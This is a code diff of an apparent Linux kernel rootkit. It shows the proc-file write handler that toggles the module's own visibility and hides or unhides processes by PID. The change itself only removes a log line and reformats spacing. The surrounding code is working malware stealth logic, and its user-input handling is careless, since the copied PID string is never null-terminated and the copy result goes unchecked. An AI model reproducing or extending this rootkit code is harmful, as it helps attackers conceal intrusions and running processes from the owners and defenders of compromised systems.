@@ -13,7 +13,6 @@ static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t 
 {
     if (strncmp(ubuf, "toggle", MIN(6, count)) == 0)
     {
-        pr_info("Toggle visibility");
         if (module_hidden)
             module_unhide();
         else
@@ -37,11 +36,11 @@ static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t 
         long pid;
         char *pidstr = kmalloc(sizeof(char) * count - 4, GFP_KERNEL);
 
-        copy_from_user(pidstr, ubuf+4, count - 4);
+        copy_from_user(pidstr, ubuf + 4, count - 4);
         kstrtol(pidstr, 10, &pid);
         kfree(pidstr);
 
-        pr_info("hide %d\n", (pid_t) pid);
+        pr_info("hide %d\n", (pid_t)pid);
         hide_proc(pid);
     }
     else if (strncmp(ubuf, "unhide", MIN(6, count)) == 0)
@@ -49,11 +48,11 @@ static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t 
         long pid;
         char *pidstr = kmalloc(sizeof(char) * count - 6, GFP_KERNEL);
 
-        copy_from_user(pidstr, ubuf+6, count - 6);
+        copy_from_user(pidstr, ubuf + 6, count - 6);
         kstrtol(pidstr, 10, &pid);
         kfree(pidstr);
 
-        pr_info("unhide %d\n", (pid_t) pid);
+        pr_info("unhide %d\n", (pid_t)pid);
         unhide_proc(pid);
     }
     return count;
